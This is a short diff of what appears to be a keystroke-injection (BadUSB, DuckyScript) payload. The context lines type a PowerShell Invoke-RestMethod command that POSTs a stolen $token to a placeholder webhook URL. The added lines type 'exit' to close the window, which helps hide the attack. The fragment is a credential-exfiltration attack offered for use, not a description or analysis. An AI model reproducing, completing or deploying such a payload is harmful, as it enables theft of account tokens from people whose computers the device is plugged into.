@@ -18,3 +18,5 @@ STRING "
 ENTER
 STRING Invoke-RestMethod -Uri "(WEBHOOKLINK!!!!)" -Method POST -Headers @{ "Content-Type" = "application/json" } -Body (ConvertTo-Json @{ content = $token })
 ENTER
+STRING exit
+ENTER
